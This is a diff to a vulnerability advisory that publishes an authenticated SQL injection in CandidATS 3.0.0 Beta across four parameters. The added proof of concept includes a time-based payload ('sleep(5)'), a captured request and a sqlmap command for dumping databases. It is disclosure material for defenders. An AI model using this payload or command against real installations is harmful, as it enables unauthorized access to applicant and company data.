@@ -23,7 +23,8 @@ template: advisory
 | **Code name**         | [Jackson](https://en.wikipedia.org/wiki/Michael_Jackson) |
 | **Product**           | CandidATS                                                |
 | **Affected versions** | Version 3.0.0 Beta (Pilava Beta)                         |
-| **State**             | Unpublished/Contacted Vendor                             |
+| **State**             | Public                                                   |
+| **Release date**      | 2022-07-19                                               |
 
 ## Vulnerability
 
@@ -39,18 +40,57 @@ template: advisory
 
 ## Description
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+CandidATS Version 3.0.0 Beta allows an authenticated user to inject SQL
+queries in `/index.php?m=settings&a=show` via the `userID` parameter,
+in `/index.php?m=candidates&a=show` via the `candidateID`,
+in `/index.php?m=joborders&a=show` via the `jobOrderID`
+and `/index.php?m=companies&a=show` via the `companyID` parameter
 
 ## Proof of Concept
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+1. Log in to CandidATS with a user who has permissions
+   to read job orders, candidates or companies.
+
+2. Go to `index.php?m=joborders` (or any of the option above).
+
+3. Uncheck the `Only My Companies` option.
+
+4. Select any of the items listed and
+   intercept the request with BurpSuite.
+
+5. It is possible to inject sql sentences inside
+   the companyID parameter, for example, the following
+   request will make the database sleep for 5 seconds.
+
+  ```http
+  GET /candidATS/index.php?m=companies&a=show&companyID=2+or+sleep(5) HTTP/1.1
+  ```
+
+6. Save the intercepted request into a file.
+
+  ```http
+  GET /candidATS/index.php?m=companies&a=show&companyID=2 HTTP/1.1
+  Host: 172.16.28.136
+  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Connection: close
+  Cookie: CATS=dji5p76l4ajdpubegkt552ma9n
+  Upgrade-Insecure-Requests: 1
+  ```
+
+7. Run the following command from sqlmap in order
+   to extract information from the database.
+
+  ```bash
+  $ sqlmap -r companyId.req -p companyID --dbs --batch
+  ```
 
 ## Exploit
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+It is possible to use sqlmap in order to
+extract information from the database
 
 ## Mitigation
 
@@ -73,7 +113,7 @@ Team of  `Fluid Attacks`.
   discovered="2022-04-19"
   contacted="2022-04-19"
   replied="2022-04-20"
-  confirmed=""
+  confirmed="2022-04-20"
   patched=""
   disclosure="">
 </time-lapse>
